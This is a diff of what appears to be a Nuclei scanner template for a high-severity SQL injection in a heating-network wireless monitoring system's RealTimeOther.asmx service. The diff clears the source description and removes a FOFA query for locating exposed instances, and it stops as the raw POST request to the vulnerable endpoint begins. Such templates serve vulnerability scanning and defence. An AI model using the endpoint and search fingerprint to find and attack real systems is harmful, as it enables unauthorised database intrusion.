@@ -3,12 +3,8 @@ info:
   name: 热网无线监测系统 RealTimeOther.asmx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/no7kpi490mmxgnb9'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: no7kpi490mmxgnb9
-    fofa: body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
 http:
 - raw:
   - 'POST /DataSrvs/RealTimeOther.asmx/ChangeStationToOld HTTP/1.1
